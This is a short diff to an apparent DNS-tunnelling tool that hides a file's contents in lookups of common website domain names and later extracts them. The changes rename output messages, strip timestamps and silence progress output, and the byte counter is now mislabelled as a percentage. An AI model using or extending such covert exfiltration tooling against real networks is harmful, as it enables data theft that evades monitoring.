@@ -491,20 +491,12 @@ def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):
 def TransferCloakedFile( cloakedFile, queryDelay ):
 
 	print("")
-	print("Broadcasting command...")
-	print("")
-	mDateTimeUTC = datetime.datetime.utcnow()
-
-	print("### Starting Time (UTC): " + mDateTimeUTC.strftime( "%x %X" ))
+	print("Broadcasting response...")
 	print("")
 
 	status = GenerateDNSQueries( cloakedFile,  queryDelay )
 
-	mDateTimeUTC = datetime.datetime.utcnow()
 
-	print("")
-	print("### Ending Time (UTC): " + mDateTimeUTC.strftime( "%x %X" ))
-	print("")
 
 	return
 
@@ -534,7 +526,7 @@ def GenerateDNSQueries(cloakedFile, queryDelay):
     byteCount = 0
     
     with open(cloakedFile, 'r') as fqdnFile:
-        print("Progress (bytes transmitted - patience is a virtue): ")
+        #print("Progress (bytes transmitted - patience is a virtue): ")
         for fqdn in fqdnFile:
             fqdnStr = fqdn.strip()
             # We don't care if the lookup fails, so carry on
@@ -545,7 +537,7 @@ def GenerateDNSQueries(cloakedFile, queryDelay):
                 time.sleep(queryDelay)
             checkpoint = byteCount % 25
             if byteCount > 0 and checkpoint == 0:
-                print(str(byteCount) + "...")
+                print(str(byteCount) + "%")
             byteCount += 1
     
     return
@@ -699,7 +691,6 @@ def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag,
 						cloakedFile.write( cipherElement )
 
 					previousDomain = domain
-					print(previousDomain, domain)
 			#print('---------------')#debug
      
 		
